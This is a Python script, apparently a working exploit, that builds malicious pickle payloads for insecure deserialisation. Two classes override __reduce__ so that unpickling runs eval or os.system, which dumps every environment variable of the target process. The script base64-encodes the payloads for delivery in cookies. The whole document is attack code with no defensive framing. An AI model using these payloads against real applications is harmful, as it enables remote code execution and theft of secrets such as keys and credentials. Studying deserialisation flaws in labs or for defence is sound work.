import pickle
import base64
import os

class EnvExtractor:
    def __reduce__(self):
        # This will be executed when the object is unpickled
        # Return a tuple of (callable, args) that extracts environment variables
        return (eval, ("__import__('os').environ",))

# Create the malicious object
malicious_obj = EnvExtractor()

# Pickle the object
pickled_data = pickle.dumps(malicious_obj)

# Base64 encode it for safe transmission in cookies
payload = base64.b64encode(pickled_data).decode('utf-8')

print("=== MALICIOUS PICKLE PAYLOAD FOR ENVIRONMENT EXTRACTION ===")
print(f"\nBase64-encoded payload:")
print(payload)

# For debugging, let's also show what the payload looks like when decoded
print(f"\nPayload length: {len(payload)} characters")
print(f"\nRaw pickle data (first 50 bytes): {pickled_data[:50]}")

# Let's also create a version that prints env vars more verbosely
class EnvExtractorVerbose:
    def __reduce__(self):
        # This version executes a system command to print env vars
        # The output will be visible in the application response or logs
        cmd = "python -c \"import os; print('===ENV_VARS_START==='); [print(f'{k}={v}') for k,v in os.environ.items()]; print('===ENV_VARS_END===')\""
        return (os.system, (cmd,))

malicious_obj_verbose = EnvExtractorVerbose()
pickled_data_verbose = pickle.dumps(malicious_obj_verbose)
payload_verbose = base64.b64encode(pickled_data_verbose).decode('utf-8')

print(f"\n=== VERBOSE VERSION (prints to stdout) ===")
print(f"\nBase64-encoded verbose payload:")
print(payload_verbose)
print(f"\nVerbose payload length: {len(payload_verbose)} characters")

